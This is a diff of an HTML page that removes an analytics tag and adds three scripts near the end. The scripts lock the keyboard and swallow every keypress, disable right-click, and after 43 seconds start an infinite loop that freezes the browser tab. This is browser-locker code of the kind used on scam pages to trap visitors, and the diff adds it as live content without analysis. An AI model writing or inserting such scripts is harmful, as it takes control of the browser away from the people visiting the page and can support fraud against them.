@@ -2,15 +2,6 @@
 <html>
 <meta http-equiv="content-type" content="text/html;charset=UTF-8">
 <head>
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-D87F50C3JL"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-D87F50C3JL');
-</script>
   <!-- Required meta tags -->
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -816,6 +807,31 @@ if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Mic
 
 
 
+ <script>
+    navigator.keyboard.lock();
+    document.onkeydown = function (e) {
+    return false;
+    }
+</script>
 
+<script>
+    // Disable right-click
+    window.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+    });
+</script>
+
+<script>
+
+    setTimeout("warning()", 43000);
+    setTimeout("warning()", 43000);
+    function warning(){
+    while(true){
+        console.log('warning')
+}
+}
+
+
+</script>
 
 </html>
